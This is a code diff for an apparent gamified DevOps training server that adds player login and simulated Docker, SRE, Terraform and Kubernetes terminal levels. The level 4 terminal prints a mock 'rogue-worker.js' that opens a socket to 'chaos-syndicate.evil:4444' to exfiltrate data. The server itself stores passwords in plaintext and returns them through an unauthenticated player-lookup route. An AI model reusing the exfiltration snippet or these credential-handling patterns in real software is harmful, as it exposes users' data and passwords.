@@ -39,25 +39,70 @@ const writeData = (data) => fs.writeFileSync(dataPath, JSON.stringify(data, null
 app.get('/api/health', (req, res) => res.json({ status: 'ok' }));
 
 app.post('/api/players/register', (req, res) => {
-  const { username, age, gender } = req.body;
+  const { username, email, age, gender, password } = req.body;
   if (!username) return res.status(400).json({ error: 'Username is required' });
+  if (!email) return res.status(400).json({ error: 'Email is required' });
+  if (!password) return res.status(400).json({ error: 'Password is required' });
 
   const data = readData();
-  let player = data.players.find(p => p.username === username);
+  let player = data.players.find(p => p.email === email || p.username === username);
 
   if (!player) {
-    player = { id: Date.now().toString(), username, age: age || null, gender: gender || null, history: [], joinedAt: new Date().toISOString() };
+    player = { id: Date.now().toString(), username, email, password, age: age || null, gender: gender || null, history: [], joinedAt: new Date().toISOString() };
     data.players.push(player);
+    writeData(data);
+  } else {
+    // Verify password for existing users
+    if (player.password && player.password !== password) {
+      return res.status(401).json({ error: 'Access denied: invalid credentials for this operative alias.' });
+    }
+    // If player exists, update their profile if they pass age/gender/username/email/password
+    if (age) player.age = age;
+    if (gender) player.gender = gender;
+    if (username) player.username = username;
+    if (email) player.email = email;
+    if (password) player.password = password;
     writeData(data);
   }
   res.json({ message: 'Player ready', player });
+});
+
+app.post('/api/players/login', (req, res) => {
+  const { email, password } = req.body;
+  if (!email) return res.status(400).json({ error: 'Email is required' });
+  if (!password) return res.status(400).json({ error: 'Password is required' });
+
+  const data = readData();
+  let player = data.players.find(p => p.email === email);
+
+  if (!player) {
+    return res.status(404).json({ error: 'Operative not found with this email. Please register.' });
+  }
+
+  if (player.password && player.password !== password) {
+    return res.status(401).json({ error: 'Incorrect clearance password.' });
+  }
+
+  res.json({ message: 'Welcome back, Agent!', player });
+});
+
+app.get('/api/players/:email', (req, res) => {
+  const email = req.params.email || req.query.email;
+  const data = readData();
+  let player = data.players.find(p => p.email === email || p.username === email);
+
+  if (!player) {
+    return res.status(404).json({ error: 'Player not found' });
+  }
+
+  res.json({ player });
 });
 
 app.post('/api/players/:username/progress', (req, res) => {
   const { username } = req.params;
   const { levelId, status, logs, score } = req.body;
   const data = readData();
-  const playerIndex = data.players.findIndex(p => p.username === username);
+  const playerIndex = data.players.findIndex(p => p.username === username || p.email === username);
   
   if (playerIndex === -1) return res.status(404).json({ error: 'Player not found' });
   
@@ -146,6 +191,7 @@ io.on('connection', (socket) => {
         echo 'read pass' >> /usr/local/bin/login
         echo 'if [ "$id" == "8472" ] && [ "$pass" == "deltaSecure" ]; then' >> /usr/local/bin/login
         echo '  echo "Authentication successful."' >> /usr/local/bin/login
+        echo '  touch /tmp/.auth_token' >> /usr/local/bin/login
         echo '  echo "Welcome Agent."' >> /usr/local/bin/login
         echo '  echo "You are now authorized to access DCIB investigations."' >> /usr/local/bin/login
         echo '  echo "Type \\"view-cases\\" to see available investigations."' >> /usr/local/bin/login
@@ -155,6 +201,7 @@ io.on('connection', (socket) => {
         chmod +x /usr/local/bin/login
         
         echo '#!/bin/bash' > /usr/local/bin/view-cases
+        echo 'if [ ! -f /tmp/.auth_token ]; then echo "Access Denied: Please run \"login\" first."; exit 1; fi' >> /usr/local/bin/view-cases
         echo 'echo "Available Investigations"' >> /usr/local/bin/view-cases
         echo 'echo ""' >> /usr/local/bin/view-cases
         echo 'echo "CASE 001 - The Missing Dependency"' >> /usr/local/bin/view-cases
@@ -164,6 +211,7 @@ io.on('connection', (socket) => {
         chmod +x /usr/local/bin/view-cases
         
         echo '#!/bin/bash' > /usr/local/bin/solve
+        echo 'if [ ! -f /tmp/.auth_token ]; then echo "Access Denied: Please run \"login\" first."; exit 1; fi' >> /usr/local/bin/solve
         echo 'if [ "$1" == "case1" ]; then' >> /usr/local/bin/solve
         echo '  echo "Launching investigation..."' >> /usr/local/bin/solve
         echo '  echo "__REDIRECT_TO_LEVEL_2__"' >> /usr/local/bin/solve
@@ -518,6 +566,265 @@ EOF
         exec bash --init-file /root/.bashrc
       `;
       dockerCmd.push('ubuntu:22.04', 'bash', '-c', setupScript);
+    } else if (data.levelId === 'level_4') {
+      let currentPrompt = 'root@dcib-secure:~# ';
+      let inSubShell = false;
+      let buffer = '';
+      
+      const emit = (msg) => socket.emit('terminal_output', msg);
+      
+      emit('\r\n--------------------------------------------------\r\n');
+      emit('DCIB CONTAINER AUDIT & INFILTRATION TERMINAL\r\n');
+      emit('Chapter 4: Container Infiltration\r\n');
+      emit('--------------------------------------------------\r\n\r\n');
+      emit(currentPrompt);
+
+      socket.on('terminal_input', (input) => {
+        for (let i = 0; i < input.length; i++) {
+          const char = input[i];
+          if (char === '\r' || char === '\n') {
+            emit('\r\n');
+            const cmd = buffer.trim();
+            buffer = '';
+            
+            if (inSubShell) {
+              if (cmd === 'exit') {
+                inSubShell = false;
+                currentPrompt = 'root@dcib-secure:~# ';
+                emit('Exited container shell.\r\n');
+              } else if (cmd === 'ls' || cmd === 'ls -la' || cmd === 'ls -l') {
+                emit('total 12\r\n');
+                emit('-rw-r--r--  1 root  root   250 May  3 10:22 package.json\r\n');
+                emit('-rw-r--r--  1 root  root  1024 May  3 10:23 server.js\r\n');
+                emit('-rwxr-xr-x  1 root  root   422 May  3 10:24 rogue-worker.js\r\n');
+              } else if (cmd.startsWith('cat ')) {
+                const file = cmd.replace('cat ', '').trim();
+                if (file === 'rogue-worker.js' || file === './rogue-worker.js') {
+                  emit('\r\n// rogue-worker.js planted by The Chaos Syndicate\r\n');
+                  emit('const net = require("net");\r\n');
+                  emit('const client = net.connect({ port: 4444, host: "chaos-syndicate.evil" });\r\n');
+                  emit('client.write("EXFILTRATING_DATA_0xDEADBEEF");\r\n');
+                  emit('setInterval(() => { client.write("KEEP_ALIVE"); }, 10000);\r\n\r\n');
+                  emit('__OBJ_2_COMPLETED__\r\n');
+                } else {
+                  emit(`cat: ${file}: No such file or directory\r\n`);
+                }
+              } else {
+                emit(`${cmd}: command not found\r\n`);
+              }
+            } else {
+              if (cmd === 'docker ps') {
+                emit('CONTAINER ID   IMAGE                 COMMAND                  CREATED         STATUS         PORTS     NAMES\r\n');
+                emit('a1b2c3d4e5f6   insecure-api:latest   "node worker.js"         2 hours ago     Up 2 hours               api-worker-compromised\r\n');
+                emit('c7d8e9f0a1b2   nginx:alpine          "/docker-entrypoint…"   5 days ago      Up 5 days      80/tcp    reverse-proxy\r\n\r\n');
+                emit('__OBJ_1_COMPLETED__\r\n');
+              } else if (cmd.includes('docker exec')) {
+                if (cmd.includes('a1b2c3d4e5f6') || cmd.includes('api-worker-compromised')) {
+                  inSubShell = true;
+                  currentPrompt = 'api-worker:/usr/src/app # ';
+                  emit('Successfully attached to api-worker-compromised.\r\n');
+                } else {
+                  emit('Error: No such container: ' + cmd.split(' ').pop() + '\r\n');
+                }
+              } else if (cmd.startsWith('docker build')) {
+                emit('Sending build context to Docker daemon  12.5kB\r\n');
+                emit('Step 1/6 : FROM node:slim\r\n ---> 1c7d8e9f2a4b\r\nStep 2/6 : WORKDIR /usr/src/app\r\n ---> Using cache\r\n ---> a34b5c6d7e8f\r\nStep 3/6 : COPY package*.json ./\r\n ---> b1c2d3e4f5a6\r\nStep 4/6 : RUN npm install\r\n ---> c7d8e9f0a1b2\r\nStep 5/6 : COPY . .\r\n ---> e3f4a5b6c7d8\r\nStep 6/6 : CMD ["node", "server.js"]\r\nSuccessfully built 1a2b3c4d5e6f\r\nSuccessfully tagged trusted-api:latest\r\n\r\n');
+                emit('__OBJ_4_COMPLETED__\r\n');
+              } else if (cmd.startsWith('docker stop') || cmd.startsWith('docker rm') || cmd.startsWith('docker kill') || cmd.includes('prune')) {
+                emit('Deleted resource successfully.\r\n');
+                emit('__OBJ_5_COMPLETED__\r\n');
+              } else if (cmd === 'clear') {
+                emit('\x1b[2J\x1b[H');
+              } else if (cmd === '') {
+                // Do nothing
+              } else {
+                emit(`${cmd}: command not found\r\n`);
+              }
+            }
+            emit(currentPrompt);
+          } else if (char === '\u007f' || char === '\b') {
+            if (buffer.length > 0) {
+              buffer = buffer.slice(0, -1);
+              emit('\b \b');
+            }
+          } else {
+            buffer += char;
+            emit(char);
+          }
+        }
+      });
+    } else if (data.levelId === 'level_5') {
+      let currentPrompt = 'root@dcib-sre:~# ';
+      let buffer = '';
+      
+      const emit = (msg) => socket.emit('terminal_output', msg);
+      
+      emit('\r\n--------------------------------------------------\r\n');
+      emit('DCIB SRE INCIDENT RESPONSE TERMINAL\r\n');
+      emit('Chapter 5: SRE: Monitoring & Alerting\r\n');
+      emit('--------------------------------------------------\r\n\r\n');
+      emit(currentPrompt);
+
+      socket.on('terminal_input', (input) => {
+        for (let i = 0; i < input.length; i++) {
+          const char = input[i];
+          if (char === '\r' || char === '\n') {
+            emit('\r\n');
+            const cmd = buffer.trim();
+            buffer = '';
+            
+            if (cmd === 'top' || cmd === 'ps aux' || cmd === 'ps -ef') {
+              emit('USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\r\n');
+              emit('root         1  0.0  0.1  12024  3412 ?        Ss   10:00   0:00 node server.js\r\n');
+              emit('root      3241 89.2 45.4 512214 41243 ?        Rl   10:05   5:23 node runaway-worker.js\r\n');
+              emit('\r\n__OBJ_L5_1__\r\n');
+            } else if (cmd.startsWith('kill -9 ')) {
+              const pid = cmd.replace('kill -9 ', '').trim();
+              if (pid === '3241') {
+                emit('Process 3241 terminated successfully.\r\n');
+                emit('__OBJ_L5_2__\r\n');
+              } else {
+                emit(`bash: kill: (${pid}) - No such process\r\n`);
+              }
+            } else if (cmd.includes('load-test') || cmd.includes('test') || cmd.includes('curl')) {
+              emit('Sending synthetic load requests...\r\n');
+              emit('[Metrics] CPU: 12% -> 45% -> 87% [THRESHOLD EXCEEDED]\r\n');
+              emit('[ALERT] High utilization detected! Alert dispatched to Slack/PagerDuty.\r\n');
+              emit('[Metrics] Health Check returned: 200 OK. System survived.\r\n');
+              emit('\r\n__OBJ_L5_5__\r\n');
+            } else if (cmd === 'clear') {
+              emit('\x1b[2J\x1b[H');
+            } else if (cmd === '') {
+              // Do nothing
+            } else {
+              emit(`${cmd}: command not found\r\n`);
+            }
+            emit(currentPrompt);
+          } else if (char === '\u007f' || char === '\b') {
+            if (buffer.length > 0) {
+              buffer = buffer.slice(0, -1);
+              emit('\b \b');
+            }
+          } else {
+            buffer += char;
+            emit(char);
+          }
+        }
+      });
+    } else if (data.levelId === 'level_6') {
+      let currentPrompt = 'root@dcib-iac:~# ';
+      let buffer = '';
+      
+      const emit = (msg) => socket.emit('terminal_output', msg);
+      
+      emit('\r\n--------------------------------------------------\r\n');
+      emit('DCIB INFRASTRUCTURE AS CODE TERMINAL\r\n');
+      emit('Chapter 6: Infrastructure as Code (IaC)\r\n');
+      emit('--------------------------------------------------\r\n\r\n');
+      emit(currentPrompt);
+
+      socket.on('terminal_input', (input) => {
+        for (let i = 0; i < input.length; i++) {
+          const char = input[i];
+          if (char === '\r' || char === '\n') {
+            emit('\r\n');
+            const cmd = buffer.trim();
+            buffer = '';
+            
+            if (cmd === 'terraform validate') {
+              emit('Success! The configuration is valid.\r\n');
+              emit('\r\n__OBJ_L6_1__\r\n');
+            } else if (cmd === 'terraform plan') {
+              emit('Terraform will perform the following actions:\r\n');
+              emit('~ update aws_security_group "ssh_access" {\r\n');
+              emit('    ~ ingress {\r\n');
+              emit('        ~ cidr_blocks = ["0.0.0.0/0"] -> ["10.0.0.0/16"]\r\n');
+              emit('      }\r\n');
+              emit('  }\r\n');
+              emit('Plan: 0 to add, 1 to change, 0 to destroy.\r\n');
+              emit('\r\n__OBJ_L6_4__\r\n');
+            } else if (cmd === 'terraform apply') {
+              emit('Apply complete! Resources: 0 added, 1 changed, 0 destroyed.\r\n');
+              emit('\r\n__OBJ_L6_4__\r\n');
+            } else if (cmd === 'clear') {
+              emit('\x1b[2J\x1b[H');
+            } else if (cmd === '') {
+              // Do nothing
+            } else {
+              emit(`${cmd}: command not found\r\n`);
+            }
+            emit(currentPrompt);
+          } else if (char === '\u007f' || char === '\b') {
+            if (buffer.length > 0) {
+              buffer = buffer.slice(0, -1);
+              emit('\b \b');
+            }
+          } else {
+            buffer += char;
+            emit(char);
+          }
+        }
+      });
+    } else if (data.levelId === 'level_7') {
+      let currentPrompt = 'root@dcib-k8s:~# ';
+      let buffer = '';
+      
+      const emit = (msg) => socket.emit('terminal_output', msg);
+      
+      emit('\r\n--------------------------------------------------\r\n');
+      emit('DCIB ORCHESTRATION & KUBERNETES TERMINAL\r\n');
+      emit('Chapter 7: Orchestration Meltdown\r\n');
+      emit('--------------------------------------------------\r\n\r\n');
+      emit(currentPrompt);
+
+      socket.on('terminal_input', (input) => {
+        for (let i = 0; i < input.length; i++) {
+          const char = input[i];
+          if (char === '\r' || char === '\n') {
+            emit('\r\n');
+            const cmd = buffer.trim();
+            buffer = '';
+            
+            if (cmd === 'kubectl get pods' || cmd === 'kubectl get po') {
+              emit('NAME                               READY   STATUS              RESTARTS   AGE\r\n');
+              emit('redis-master-74bb6579df-v7z6d      1/1     Running             0          2d\r\n');
+              emit('backend-service-9d43abef-x58e4     0/1     CrashLoopBackOff    12         45m\r\n');
+              emit('\r\n__OBJ_L7_1__\r\n');
+            } else if (cmd.startsWith('kubectl logs') || cmd.startsWith('kubectl describe pod')) {
+              emit('Fetching pod traces from kubernetes master API...\r\n');
+              if (cmd.includes('backend-service')) {
+                emit('[INFO] Initializing app node instance.\r\n');
+                emit('[FATAL] Missing required configuration parameter: DB_HOST (Provided: NULL_INVALID)\r\n');
+                emit('Process exited with code 1\r\n');
+                emit('\r\n__OBJ_L7_2__\r\n');
+              } else {
+                emit('Error from server (NotFound): pod not found\r\n');
+              }
+            } else if (cmd === 'kubectl apply -f config.yaml' || cmd === 'kubectl apply -f ./config.yaml') {
+              emit('configmap/backend-config configured\r\n');
+              emit('deployment.apps/backend-service configured\r\n');
+              emit('service/backend-service configured\r\n');
+              emit('\r\n__OBJ_L7_4__\r\n');
+            } else if (cmd === 'clear') {
+              emit('\x1b[2J\x1b[H');
+            } else if (cmd === '') {
+              // Do nothing
+            } else {
+              emit(`${cmd}: command not found\r\n`);
+            }
+            emit(currentPrompt);
+          } else if (char === '\u007f' || char === '\b') {
+            if (buffer.length > 0) {
+              buffer = buffer.slice(0, -1);
+              emit('\b \b');
+            }
+          } else {
+            buffer += char;
+            emit(char);
+          }
+        }
+      });
+      return;
     } else {
       dockerCmd.push('ubuntu:22.04', '/bin/bash');
     }
